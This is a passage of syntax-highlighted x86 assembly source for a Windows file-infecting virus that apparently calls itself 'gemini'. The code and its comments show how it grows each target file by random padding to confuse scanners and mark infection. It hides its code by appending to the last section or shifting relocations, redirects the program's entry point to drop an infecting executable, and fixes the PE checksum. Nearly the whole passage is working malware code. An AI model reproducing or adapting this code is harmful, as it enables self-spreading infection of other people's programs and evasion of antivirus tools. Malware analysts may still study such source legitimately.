</span><span class="sc5">cGetTickCount</span><span class="sc0">           </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kGetTickCount</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_krncrc</span><span class="sc0">
</span><span class="sc5">cGetTickCount</span><span class="sc0">           </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">cCreateThread</span><span class="sc0">           </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kCreateThread</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_krncrc</span><span class="sc0">
</span><span class="sc5">cCreateThread</span><span class="sc0">           </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">cCloseHandle</span><span class="sc0">            </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kCloseHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">cCloseHandle</span><span class="sc0">            </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">call_krncrc</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">store_krnapi</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'!bgr'</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">call_krncrc</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;infect file in two parts</span><span class="sc0">
</span><span class="sc1">;algorithm:     increase file size by random amount (RANDPADMIN-RANDPADMAX</span><span class="sc0">
</span><span class="sc1">;               bytes) to confuse scanners that look at end of file (also</span><span class="sc0">
</span><span class="sc1">;               infection marker)</span><span class="sc0">
</span><span class="sc1">;               if reloc table is not in last section (taken from relocation</span><span class="sc0">
</span><span class="sc1">;               field in PE header, not section name), then append to last</span><span class="sc0">
</span><span class="sc1">;               section.  otherwise, move relocs down and insert code into</span><span class="sc0">
</span><span class="sc1">;               space (to confuse people looking at end of file.  they will</span><span class="sc0">
</span><span class="sc1">;               see only relocation data and garbage or many zeroes)</span><span class="sc0">
</span><span class="sc1">;               entry point is altered to point to some code.  very simple</span><span class="sc0">
</span><span class="sc1">;               however, that code just drops exe and returns</span><span class="sc0">
</span><span class="sc1">;               exe contains infection routine</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">infect_file</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;esi -&gt; findlist, edi = map view</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">open_append</span><span class="sc0">

</span><span class="sc5">delta_label</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mzhdr.mzlfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pecoff.pesectcount</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">pesect</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pecoff.peopthdrsize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pemagic</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">pesect</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pesect.sectrawsize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gemini_codeend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gemini_exe</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pefilealign</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                        </span><span class="sc1">;file align last section</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pesect.sectrawsize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pesect.sectrawaddr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;raw size is file aligned.  virtual size is not required to be section aligned</span><span class="sc0">
</span><span class="sc1">;so if old virtual size is larger than new raw size, then size of image does</span><span class="sc0">
</span><span class="sc1">;not need to be updated, else virtual size must be large enough to cover the</span><span class="sc0">
</span><span class="sc1">;new code, and size of image is section aligned</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pesect.sectvirtaddr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pesect.sectrawaddr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pesect.sectvirtsize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pesect.sectrawaddr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">test_reloff</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pesect.sectvirtsize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pesect.sectrawaddr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pesectalign</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.peimagesize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;if relocation table is not in last section, then append to last section</span><span class="sc0">
</span><span class="sc1">;otherwise, move relocations down and insert code into space</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">test_reloff</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pecoff.peflags</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_RELOCS_STRIPPED</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">copy_code</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pereloc.dirrva</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">copy_code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pesect.sectvirtsize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pesect.sectrawaddr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pereloc.dirrva</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">copy_code</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pereloc.dirrva</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">std</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movs</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">copy_code</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gemini_exe</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_label</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">infectstk.infseh.mapsehinfret</span><span class="sc4">]</span><span class="sc0">
                                                </span><span class="sc1">;delta offset</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movs</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;alter entry point</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gemini_inf</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gemini_exe</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.peentrypoint</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_patch</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gemini_codeend</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;CheckSumMappedFile() - simply sum of all words in file, then adc filesize</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">infect_ret</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">

</span><span class="sc5">calc_checksum</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">calc_checksum</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;avoid common bug.  ADC not ADD</span><span class="sc0">

</span><span class="sc5">infect_ret</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">                               </span><span class="sc1">;common exit using SEH</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"*4U2NV*"</span><span class="sc0">                       </span><span class="sc1">;that is, unless you're reading this</span><span class="sc0">
</span><span class="sc5">test_infect</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;virus code begins here in infected files</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">gemini_inf</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">walk_seh</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;API CRC table, null terminated</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">expcrcbegin</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;place &lt; 80h bytes from call for smaller code</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">expcrc_count</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">expcrcend</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">drop_exp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">expcrcend</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">explabel</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
